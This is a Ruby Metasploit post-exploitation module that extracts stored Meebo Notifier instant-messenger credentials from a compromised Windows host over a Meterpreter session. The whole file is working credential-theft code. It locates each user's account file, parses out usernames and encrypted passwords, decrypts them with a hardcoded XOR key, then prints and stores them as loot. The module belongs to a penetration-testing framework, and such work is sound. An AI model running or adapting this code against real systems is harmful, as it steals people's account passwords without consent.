##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Auxiliary::Report
  include Msf::Post::Windows::UserProfiles

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Gather Meebo Password Extractor',
        'Description' => %q{
          This module extracts login account password stored by
          Meebo Notifier, a desktop version of Meebo's Online Messenger.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Sil3ntDre4m <sil3ntdre4m[at]gmail.com>',
          'Unknown', # SecurityXploded Team, www.SecurityXploded.com
        ],
        'Platform' => [ 'win' ],
        'SessionTypes' => [ 'meterpreter' ],
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              core_channel_eof
              core_channel_open
              core_channel_read
              core_channel_write
              stdapi_fs_stat
            ]
          }
        }
      )
    )
  end

  def run
    grab_user_profiles.each do |user|
      accounts = user['AppData'] + '\\Meebo\\MeeboAccounts.txt'
      next if user['AppData'].nil?
      next if accounts.empty?

      stat = begin
        session.fs.file.stat(accounts)
      rescue StandardError
        nil
      end
      next if stat.nil?

      parse_txt(accounts)
    end
  end

  def parse_txt(file)
    creds = Rex::Text::Table.new(
      'Header' => 'Meebo Instant Messenger Credentials',
      'Indent'	=> 1,
      'Columns' =>
      [
        'User',
        'Password',
        'Protocol'
      ]
    )

    config = client.fs.file.new(file, 'r')
    parse = config.read

    if (parse =~ /"password.{5}(.*)",\s*"protocol.{4}(\d),\s*"username.{5}(.*)"/)
      epass = ::Regexp.last_match(1)
      protocol = ::Regexp.last_match(2).to_i
      username = ::Regexp.last_match(3)
    else
      print_error('Regex failed...')
      return
    end

    protocol = 'Meebo' if protocol == 0
    protocol = 'AIM' if protocol == 1
    protocol = 'Yahoo IM' if protocol == 2
    protocol = 'Windows Live' if protocol == 3
    protocol = 'Google Talk' if protocol == 4
    protocol = 'ICQ' if protocol == 5
    protocol = 'Jabber' if protocol == 6
    protocol = 'Myspace IM' if protocol == 7

    passwd = decrypt(epass)
    print_good("*** Protocol: #{protocol}  User: #{username}  Password: #{passwd}  ***")
    creds << [username, passwd, protocol]
    config.close

    if passwd.nil? || username.nil?
      print_status('Meebo credentials have not been found')
    else
      print_status('Storing data...')
      path = store_loot(
        'meebo.user.creds',
        'text/csv',
        session,
        creds.to_csv,
        'meebo_user_creds.csv',
        'Meebo Notifier User Credentials'
      )
      print_good("Meebo Notifier user credentials saved in: #{path}")
    end
  rescue ::Exception => e
    print_error("An error has occurred: #{e}")
  end

  def decrypt(epass)
    magicarr = [
      4, 240, 122, 53, 65, 19, 163, 124, 109,
      73, 187, 3, 34, 93, 15, 138, 11, 153, 148, 147, 146,
      222, 129, 160, 199, 104, 240, 43, 89, 105, 204, 236,
      253, 168, 96, 48, 158, 143, 173, 60, 215, 104, 112,
      149, 15, 114, 107, 4, 92, 149, 48, 177, 42, 133, 124,
      152, 63, 137, 2, 40, 84, 131
    ]

    plaintext = [epass].pack('H*').unpack('C*')

    for i in 0..plaintext.length - 1 do
      plaintext[i] ^= magicarr[i]
    end

    return plaintext.pack('C*')
  end
end
